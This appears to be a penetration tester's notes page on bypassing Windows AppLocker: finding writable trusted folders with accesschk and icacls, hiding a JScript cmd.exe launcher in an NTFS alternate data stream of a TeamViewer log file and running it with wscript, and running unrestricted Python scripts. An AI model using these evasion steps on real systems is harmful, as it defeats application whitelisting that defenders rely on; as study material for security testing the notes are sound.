---
layout:     post
author:     0x5c4r3
type: docs
permalink: Alternate_Data_Streams
---


<span style="font-size: 35px; color:red"><b>Trusted Folders, Alternate Data Streams and Third Party Executables</b></span>
&nbsp;
<span style="font-size: 25px; color:white"><b>Trusted Folders</b></span>

The default rules for AppLocker whitelist all executables and scripts located in <span style="color:red">C:\Program Files</span>,<span style="color:red">C:\Program Files (x86)</span>, and <span style="color:red">C:\Windows</span> (non-admin users cannot write executables or scripts into these directories.).

To locate user1 <span style="color:red">Writable</span> folders in <span style="color:red">C:\Windows</span>, use accesschk.exe from Sysinternals:
```shell
accesschk.exe "user1" C:\Windwos -wus
```
(<span style="color:red">-w</span> to locate writable directories, <span style="color:red">-u</span> to suppress any errors and <span style="color:red">-s</span> to recurse through all subdirectories)

To locate user1 <span style="color:red">Executable</span> folders, use the native <span style="color:red">icacls</span>:
```shell
icacls.exe C:\Windwos\Tasks
```
RX means that any user on the system will have both read and execute permissions within the directory.
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Alternate Data Stream</b></span>

The modern Windows file system is based on the <span style="color:red">NTFS</span> specification, which represents all files as a stream of data and supports multiple streams.
An <span style="color:red">Alternate Data Stream</span> (_ADS_) is a binary file attribute that contains metadata.
We can leverage this to append the binary data of additional streams to the original file.

I.E.
```js
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
```
Save this code to a file <span style="color:red">test.js</span>. Print it to another writable and executable file's data stream like so:

```shell
type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
```

Execute it then with <span style="color:red">wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"</span>
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Third Party Executable</b></span>

Applocker only enforces rules against default native Windows executables.
A third party scripting engine like Python, Java or Perl won't be detected.

I.E.
```shell
echo print("This executed") > test.py
```

```python
python test.py
```
